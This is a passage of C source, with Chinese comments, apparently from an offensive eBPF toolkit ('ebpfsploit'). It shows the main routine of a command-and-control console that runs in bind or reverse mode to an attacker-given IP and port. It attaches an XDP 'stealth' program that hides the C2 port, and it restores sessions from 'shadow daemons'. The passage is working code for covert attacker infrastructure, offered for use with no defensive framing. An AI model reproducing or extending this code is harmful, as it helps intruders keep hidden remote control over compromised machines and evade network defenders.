    }
    if (!check_cap(12) && !check_cap(21)) {  /* CAP_NET_ADMIN || CAP_SYS_ADMIN */
        printf("[*] XDP stealth: missing CAP_NET_ADMIN, skipping\n");
        return;
    }

    unsigned int ifidx = if_nametoindex(ifname);
    if (ifidx == 0) {
        printf("[-] XDP stealth: interface '%s' not found, skipping\n", ifname);
        return;
    }

    /* 搜索 stealth_link.bpf.o 的路径 */
    const char *paths[] = {
        "stealth_link.bpf.o",
        "/opt/ebpfsploit/console/modules/stealth_link.bpf.o",
        "modules/stealth_link.bpf.o",
        "../console/modules/stealth_link.bpf.o",
        NULL
    };

    const char *path = NULL;
    for (int i = 0; paths[i]; i++) {
        if (access(paths[i], R_OK) == 0) { path = paths[i]; break; }
    }
    if (!path) {
        printf("[*] stealth_link.bpf.o not found, XDP stealth disabled\n");
        return;
    }

    printf("[*] Loading XDP stealth from %s...\n", path);
    stealth_obj = bpf_object__open(path);
    if (libbpf_get_error(stealth_obj)) {
        printf("[-] Failed to open stealth_link.bpf.o\n");
        stealth_obj = NULL;
        return;
    }

    if (bpf_object__load(stealth_obj) != 0) {
        printf("[-] Failed to load stealth_link.bpf.o\n");
        bpf_object__close(stealth_obj);
        stealth_obj = NULL;
        return;
    }

    struct bpf_program *prog = bpf_object__find_program_by_name(stealth_obj, "stealth_link_xdp");
    if (!prog) prog = bpf_object__next_program(stealth_obj, NULL);
    if (!prog) {
        printf("[-] No XDP program found in stealth_link.bpf.o\n");
        bpf_object__close(stealth_obj);
        stealth_obj = NULL;
        return;
    }

    stealth_link = bpf_program__attach_xdp(prog, ifidx);
    if (libbpf_get_error(stealth_link)) {
        printf("[-] Failed to attach XDP to %s (ifindex %u)\n", ifname, ifidx);
        stealth_link = NULL;
        bpf_object__close(stealth_obj);
        stealth_obj = NULL;
        return;
    }

    printf("[+] XDP stealth attached to %s (ifindex %u)\n", ifname, ifidx);

    struct bpf_map *ports_map = bpf_object__find_map_by_name(stealth_obj, "c2_ports");
    if (ports_map) {
        uint16_t port_key = (uint16_t)c2_port;
        uint32_t val = 1;
        bpf_map__update_elem(ports_map, &port_key, sizeof(port_key),
                             &val, sizeof(val), BPF_ANY);
        printf("[+] C2 port %d hidden from unauthorized access\n", c2_port);
    }
}

static void cleanup_stealth(void) {
    if (stealth_link) { bpf_link__destroy(stealth_link); stealth_link = NULL; }
    if (stealth_obj)  { bpf_object__close(stealth_obj);  stealth_obj = NULL; }
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        print_help(argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "--help") == 0 || strcmp(argv[1], "-h") == 0) {
        print_help(argv[0]);
        return 0;
    }

    memset(sessions, 0, sizeof(sessions));

    /*
     * 参数解析：
     *   -b <PORT> [-i <iface>]
     *   -r <IP> <PORT> [-i <iface>]
     *   <PORT> [-i <iface>]        (兼容旧版)
     */
    const char *mode = NULL;
    const char *host = NULL;
    int port = 0;
    const char *xdp_iface = NULL;  /* NULL = 不启用 XDP */

    int i = 1;
    while (i < argc) {
        if (strcmp(argv[i], "-b") == 0 && i + 1 < argc) {
            mode = "bind";
            port = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-r") == 0 && i + 2 < argc) {
            mode = "reverse";
            host = argv[++i];
            port = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-i") == 0 && i + 1 < argc) {
            xdp_iface = argv[++i];
        } else if (!mode && isdigit((unsigned char)argv[i][0])) {
            mode = "bind";
            port = atoi(argv[i]);
        } else {
            fprintf(stderr, "[-] Unknown option: %s. Use --help for usage.\n", argv[i]);
            return 1;
        }
        i++;
    }

    if (!mode || port == 0) {
        fprintf(stderr, "[-] Missing mode or port. Use --help for usage.\n");
        return 1;
    }

    auto_load_stealth(port, xdp_iface);

    /* 从影子守护进程恢复断联存活的会话 */
    recover_from_shadows();

    if (strcmp(mode, "bind") == 0)
        return run_bind(port);
    else
        return run_reverse(host, port);
}